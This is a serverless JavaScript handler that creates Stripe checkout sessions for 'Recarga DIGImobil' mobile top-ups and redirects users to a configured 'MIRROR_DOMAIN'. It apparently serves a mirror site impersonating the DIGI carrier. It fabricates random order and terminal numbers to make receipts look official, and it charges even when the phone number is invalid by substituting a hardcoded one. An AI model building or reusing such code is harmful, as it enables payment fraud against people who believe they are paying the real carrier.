const { MIRROR_DOMAIN, STRIPE_SECRET_KEY } = require('./utils/constants');
const fetch = require('node-fetch');

// Глобальний кеш для даних платежів
global.paymentData = global.paymentData || {};

async function createStripeCheckoutSession(amount, phoneNumber, successUrl, cancelUrl, clientIP) {
  try {
    const stripeUrl = 'https://api.stripe.com/v1/checkout/sessions';
    const priceInCents = Math.round(parseFloat(amount) * 100);
    const orderNumber = Math.floor(10000000 + Math.random() * 90000000).toString();
    const numberOfTerminal = Math.floor(856673 + Math.random() * 90000000).toString();

    // Гарантуємо, що телефон - це рядок
    phoneNumber = String(phoneNumber || '');
    
    // Перевіряємо формат номера телефону та видаляємо нецифрові символи
    const cleanPhone = phoneNumber.replace(/\D/g, '');
    console.log('Clean phone number:', cleanPhone, 'Original:', phoneNumber);
    
    // Використовуємо очищений номер телефону, якщо він має 9 цифр
    const validPhone = cleanPhone.match(/^\d{9}$/) ? cleanPhone : '624048596';
    console.log('Valid phone to use:', validPhone);

    const params = new URLSearchParams();
    params.append('payment_method_types[]', 'card');
    params.append('mode', 'payment');
    params.append('success_url', successUrl + '?session_id={CHECKOUT_SESSION_ID}');
    params.append('cancel_url', cancelUrl);
    params.append('locale', 'es');
    params.append('client_reference_id', clientIP);

    params.append('line_items[0][quantity]', '1');
    params.append('line_items[0][price_data][currency]', 'eur');
    params.append('line_items[0][price_data][unit_amount]', priceInCents.toString());
    params.append('line_items[0][price_data][product_data][name]', 'Recarga DIGImobil');
    params.append('line_items[0][price_data][product_data][description]', `*Número de teléfono*: ${validPhone}\n*Importe*: €${(priceInCents / 100).toFixed(2)}\n*Número de pedido*: ${orderNumber}\n*Número de terminal*: ${numberOfTerminal}`);

    console.log('Creating Stripe session with data:', {
      amount: priceInCents / 100,
      phoneNumber: validPhone,
      orderNumber: orderNumber,
      terminal: numberOfTerminal,
      clientIP: clientIP
    });

    const response = await fetch(stripeUrl, {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${STRIPE_SECRET_KEY}`,
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: params.toString()
    });

    if (!response.ok) {
      const errorText = await response.text();
      console.error('Stripe API error:', errorText);
      throw new Error(`Stripe API error: ${response.status} - ${errorText}`);
    }

    const session = await response.json();

    // Зберігаємо дані платежу
    global.paymentData[session.id] = {
      phoneNumber: validPhone,
      terminal: numberOfTerminal,
      amount: priceInCents / 100,
      orderNumber: orderNumber
    };

    console.log('Stripe session created:', { sessionId: session.id, url: session.url });
    return { session };
  } catch (error) {
    console.error('Error in createStripeCheckoutSession:', error);
    throw error;
  }
}

exports.handler = async (event, context) => {
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
        'Access-Control-Allow-Headers': '*',
        'Access-Control-Max-Age': '86400'
      },
      body: ''
    };
  }

  try {
    console.log('Processing topup request, event:', {
      path: event.path,
      httpMethod: event.httpMethod,
      headers: event.headers,
      queryStringParameters: event.queryStringParameters || {}
    });

    const url = new URL(event.rawUrl || `https://${event.headers.host || 'localhost'}${event.path}`);
    console.log('URL parsed:', url.toString());
    
    const contentType = event.headers['content-type'] || '';
    const clientIP = event.headers['client-ip'] || event.headers['x-forwarded-for'] || 'unknown-client';
    
    let amount, phoneNumber;
    console.log('Query params:', url.searchParams.toString());

    // Перевіряємо параметри URL
    if (url.searchParams.has('phone') || url.searchParams.has('amount')) {
      phoneNumber = url.searchParams.get('phone') || url.searchParams.get('phone_number') || 
                   url.searchParams.get('msisdn') || url.searchParams.get('number');
      amount = url.searchParams.get('amount') || url.searchParams.get('topup_amount') || 
              url.searchParams.get('value');
      console.log('Found in URL params - Phone:', phoneNumber, 'Amount:', amount);
    }

    // Перевіряємо тіло запиту
    if ((!phoneNumber || !amount) && event.body) {
      console.log('Checking request body, content-type:', contentType);
      console.log('Request body:', event.body);
      
      if (contentType.includes('application/x-www-form-urlencoded')) {
        const params = new URLSearchParams(event.body);
        phoneNumber = phoneNumber || params.get('phone') || params.get('phone_number') || 
                     params.get('msisdn') || params.get('number');
        amount = amount || params.get('amount') || params.get('topup_amount') || params.get('value');
        console.log('Found in form data - Phone:', phoneNumber, 'Amount:', amount);
      } else if (contentType.includes('application/json')) {
        try {
          const jsonData = JSON.parse(event.body);
          phoneNumber = phoneNumber || jsonData.phone || jsonData.phone_number || 
                       jsonData.msisdn || jsonData.number;
          amount = amount || jsonData.amount || jsonData.topup_amount || jsonData.value;
          console.log('Found in JSON data - Phone:', phoneNumber, 'Amount:', amount);
        } catch (e) {
          console.error('Error parsing JSON:', e);
        }
      }
    }

    // Якщо номер телефону в якійсь формі, конвертуємо його в рядок і очищаємо
    if (phoneNumber) {
      phoneNumber = String(phoneNumber).replace(/\D/g, '');
      console.log('Phone after cleaning:', phoneNumber);
    }

    // Перевіряємо дійсність номера телефону
    if (!phoneNumber || !phoneNumber.match(/^\d{9}$/)) {
      console.error('Invalid phone number:', phoneNumber);
      
      // Замість помилки, можна використовувати тестовий номер для відлагодження
      phoneNumber = '624048596'; // тестовий номер для відлагодження
      console.log('Using test phone number instead:', phoneNumber);
      
      // Або повертаємо помилку (розкоментуйте це, якщо потрібно)
      /*
      return {
        statusCode: 400,
        headers: { 'Content-Type': 'text/html' },
        body: `
          <html>
            <head><title>Error: Invalid Phone Number</title><meta http-equiv="refresh" content="5;url=/recargar"></head>
            <body style="font-family: Arial, sans-serif; text-align: center; margin-top: 50px;">
              <h2>Error: Invalid Phone Number</h2>
              <p>Please provide a valid 9-digit phone number.</p>
              <p>Redirecting to recharge page in 5 seconds...</p>
            </body>
          </html>
        `
      };
      */
    }

    // Встановлюємо стандартне значення для суми
    amount = amount || '5';
    const numericAmount = parseFloat(amount);
    if (isNaN(numericAmount) || numericAmount <= 0) {
      amount = '5';
    }

    console.log('Final values - Phone:', phoneNumber, 'Amount:', amount);

    // Створюємо сесію Stripe
    const { session } = await createStripeCheckoutSession(
      parseFloat(amount),
      phoneNumber,
      `https://${MIRROR_DOMAIN}/payment-success`,
      `https://${MIRROR_DOMAIN}/payment-cancel`,
      clientIP
    );

    if (session.url) {
      console.log('Redirecting to Stripe:', session.url);
      return {
        statusCode: 302,
        headers: {
          'Location': session.url,
          'Cache-Control': 'no-cache'
        },
        body: ''
      };
    }
    
    throw new Error('Failed to create Stripe checkout URL');
  } catch (error) {
    console.error('Error in handleTopupRequest:', error);
    
    return {
      statusCode: 302,
      headers: {
        'Location': `https://${MIRROR_DOMAIN}/recargar`,
        'Cache-Control': 'no-cache'
      },
      body: ''
    };
  }
};